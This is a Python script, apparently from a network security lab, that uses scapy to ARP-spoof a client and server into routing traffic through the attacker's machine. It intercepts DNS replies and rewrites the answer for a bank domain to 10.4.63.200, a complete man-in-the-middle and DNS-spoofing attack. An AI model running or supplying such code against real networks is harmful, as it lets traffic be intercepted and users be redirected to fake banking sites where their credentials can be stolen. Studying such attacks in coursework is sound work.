# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
	arp_pack = ARP(op=1, hwsrc=attackerMAC, psrc=attackerIP, pdst=IP)
	response = sr1(arp_pack)
	return response.getlayer(ARP).hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    arp_pack = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
    send(arp_pack)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    arp_pack = ARP(op=2, hwsrc=srcMAC, psrc=srcIP, hwdst=dstMAC, pdst=dstIP)
    send(arp_pack)


# TODO: handle intercepted packets
def interceptor(packet):
	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
	# The packet should only be intercepted if it's caused from a spoofed ARP table
	if packet != None and packet.haslayer(IP) and packet.getlayer(Ether).src != attackerMAC and packet.getlayer(IP).src != attackerIP and packet.getlayer(IP).dst != attackerIP:
		#packet.show()
		if packet.haslayer(DNS):
			if packet.getlayer(DNS).qr == 0:
				debug(f"The above packet is a DNS request packet!")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = serverMAC
				#packet.show()
				sendp(packet)
			elif packet.getlayer(DNS).qr == 1:
				debug(f"The above packet is a DNS response packet!")
				original_length = len(packet.getlayer(UDP))
				debug(f"The original UDP packet is length {original_length}")
				ip_length = len(packet.getlayer(IP))
				debug(f"The original IP packet is length {ip_length}")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = clientMAC
				if packet.getlayer(DNS).ancount == 1:
					# Change the address of www.bankofbailey.com to 10.4.63.200
					packet[DNS].an.rdata = '10.4.63.200'
					# Scapy has the power to automatically fill in any empty attributes in any of the layers. so delete the things that need updating, and Scapy will fill them in accordingly
					del packet.getlayer(UDP).len
					del packet.getlayer(IP).len
					del packet.getlayer(IP).chksum
					del packet.getlayer(UDP).chksum
				#packet.show()
				sendp(packet)


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    attackerIP = get_if_addr(args.interface)
    clientIP = args.clientIP
    serverIP = args.serverIP

    attackerMAC = get_if_hwaddr(args.interface)
    debug(f"Attacker MAC is {attackerMAC}")
    clientMAC = mac(clientIP)
    debug(f"Client MAC is {clientMAC}")
    serverMAC = mac(serverIP)
    debug(f"Server MAC is {serverMAC}")

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
